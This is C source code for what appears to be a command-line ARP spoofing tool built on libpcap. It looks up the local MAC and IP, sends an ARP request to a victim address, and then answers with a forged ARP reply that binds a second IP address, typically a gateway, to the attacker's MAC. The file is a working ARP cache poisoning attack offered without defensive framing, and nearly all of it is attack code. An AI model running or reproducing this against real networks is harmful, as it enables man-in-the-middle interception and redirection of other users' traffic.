#include<stdint.h>
#include<stdio.h>
#include<pcap.h>
#include<netinet/if_ether.h>
#include<string.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<unistd.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<ifaddrs.h>
#include<errno.h>
#include<sys/socket.h>
#include<netdb.h>
#define IP_ADDR_LEN 4

uint8_t my_mac[ETHER_ADDR_LEN];
uint8_t my_ip[IP_ADDR_LEN];

struct arp_pkthdr{
  uint8_t des_mac[ETHER_ADDR_LEN];
  uint8_t src_mac[ETHER_ADDR_LEN];
  uint16_t eth_type;

  uint16_t hw_adr_type;
  uint16_t prt_adr_type;
  uint8_t hw_adr_len;
  uint8_t prt_adr_len;
  uint16_t opcode;
  uint8_t sen_hw_adr[ETHER_ADDR_LEN];
  uint8_t sen_ip_adr[IP_ADDR_LEN];
  uint8_t tgt_hw_adr[ETHER_ADDR_LEN];
  uint8_t tgt_ip_adr[IP_ADDR_LEN];
};

uint8_t ip_chartonum(uint8_t * ptr, int cnt){
  int idx=0,cn=0;
  uint8_t result=0;
  while(cn!=cnt){
    if(ptr[idx]=='.')
      cn++;
    idx++;
  }
  for(int i=idx;ptr[i]!='.'&&ptr[i]!='\0';i++){
    result = result*10+ptr[i]-'0';
  }
  return result;
}


void get_my_ip(){
  FILE *f;
  char line[100] , *p , *c;   
  f = fopen("/proc/net/route" , "r");
  while(fgets(line , 100 , f)){
    p = strtok(line , " \t");
    c = strtok(NULL , " \t");
    if(p!=NULL && c!=NULL){
      if(strcmp(c , "00000000") == 0){
        printf("Default interface is : %s \n" , p);
        break;
      }
    }
  }
  //which family do we require , AF_INET or AF_INET6
  int fm = AF_INET;
  struct ifaddrs *ifaddr, *ifa;
  int family , s;
  char host[NI_MAXHOST];
  if(getifaddrs(&ifaddr) == -1){
    perror("getifaddrs");
    exit(EXIT_FAILURE);
  }
  //Walk through linked list, maintaining head pointer so we can free list later
  for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next){
    if(ifa->ifa_addr == NULL){
      continue;
    }
    family = ifa->ifa_addr->sa_family;
    if(strcmp( ifa->ifa_name , p) == 0){
      if(family == fm){
        s = getnameinfo( ifa->ifa_addr, (family == AF_INET) ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6) , host , NI_MAXHOST , NULL , 0 , NI_NUMERICHOST);
        if(s != 0){
          //printf("getnameinfo() failed: %s\n", gai_strerror(s));
          exit(EXIT_FAILURE);
        }
        //printf("address: %s", host);
        for(int i=0;i<IP_ADDR_LEN;i++){
          my_ip[i] = ip_chartonum((uint8_t *)host,i);
        }
      }
        //printf("\n");
    }
  }
  freeifaddrs(ifaddr);
}

void get_my_mac(){
  struct ifreq ifr;
  struct ifconf ifc;
  char buf[1024];
  int success = 0;
  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
  if (sock == -1) { /* handle error*/ };
  ifc.ifc_len = sizeof(buf);
  ifc.ifc_buf = buf;
  if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

  struct ifreq* it = ifc.ifc_req;
  const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

  for (; it != end; ++it) {
    strcpy(ifr.ifr_name, it->ifr_name);
    if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
      if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
          success = 1;
          break;
        }
      }
    }
    else { /* handle error */ }
  }

  if (success) memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
}

bool check_packet(struct arp_pkthdr * pkt){
  if(ntohs(pkt->eth_type)!=ETHERTYPE_ARP)
    return false;
  if(pkt->opcode!=htons(ARPOP_REPLY))
    return false;
  return true;
}

void set_send_packet(uint8_t * pkt, uint8_t * ip){
  struct arp_pkthdr * ptr;
  ptr = (struct arp_pkthdr *) pkt;
  for(int i=0;i<ETHER_ADDR_LEN;i++){
    ptr->des_mac[i] = 0xff;
    ptr->src_mac[i] = my_mac[i];
    ptr->sen_hw_adr[i] = my_mac[i];
    ptr->tgt_hw_adr[i] = 0x00;
  }
  ptr->eth_type = htons(ETHERTYPE_ARP);
  ptr->hw_adr_type = htons(ARPHRD_ETHER);
  ptr->prt_adr_type = htons(ETHERTYPE_IP);
  ptr->hw_adr_len = ETHER_ADDR_LEN;
  ptr->prt_adr_len = IP_ADDR_LEN;
  ptr->opcode = htons(ARPOP_REQUEST);
  for(int i=0;i<IP_ADDR_LEN;i++){
    ptr->sen_ip_adr[i] = my_ip[i];
    ptr->tgt_ip_adr[i] = ip_chartonum(ip,i);
  }
}

void set_attack_packet(uint8_t * atk_pkt,uint8_t * ip,uint8_t * pkt){
  struct arp_pkthdr * atk_ptr, * ptr;
  atk_ptr = (struct arp_pkthdr *) atk_pkt;
  ptr = (struct arp_pkthdr *) pkt;
  for(int i=0;i<ETHER_ADDR_LEN;i++){
    atk_ptr->des_mac[i] = ptr->src_mac[i];
    atk_ptr->src_mac[i] = my_mac[i];
    atk_ptr->sen_hw_adr[i] = my_mac[i];
    atk_ptr->tgt_hw_adr[i] = ptr->src_mac[i];
  }
  atk_ptr->eth_type = htons(ETHERTYPE_ARP);
  atk_ptr->hw_adr_type = htons(ARPHRD_ETHER);
  atk_ptr->prt_adr_type = htons(ETHERTYPE_IP);
  atk_ptr->hw_adr_len = ETHER_ADDR_LEN;
  atk_ptr->prt_adr_len = IP_ADDR_LEN;
  atk_ptr->opcode = htons(ARPOP_REPLY);
  for(int i=0;i<IP_ADDR_LEN;i++){
    atk_ptr->sen_ip_adr[i] = ip_chartonum(ip,i);
    atk_ptr->tgt_ip_adr[i] = ptr->sen_ip_adr[i];
  }
}

int main(int argc, char* argv[]) {
  if (argc <4)
    return -1;
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  //pcap_t* handle = pcap_open_offline(argv[1],errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  get_my_mac();
  get_my_ip();
  uint8_t *  send_packet;
  send_packet = (uint8_t *)malloc(sizeof(struct arp_pkthdr));
  set_send_packet(send_packet,(uint8_t *)argv[2]);
  pcap_sendpacket(handle,(uint8_t *)send_packet,sizeof(arp_pkthdr));
  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    printf("==============================\n");
    printf("We captured %u bytes\n",header->caplen);
    if(!check_packet((struct arp_pkthdr *)packet))
      continue;
    uint8_t * attack_packet;
    attack_packet = (uint8_t *)malloc(sizeof(struct arp_pkthdr));
    set_attack_packet(attack_packet,(uint8_t *)argv[3],(uint8_t *)packet);
    pcap_sendpacket(handle,(uint8_t *)attack_packet,sizeof(arp_pkthdr));
    break;
    printf("\n");
  }
  pcap_close(handle);
  return 0;
}


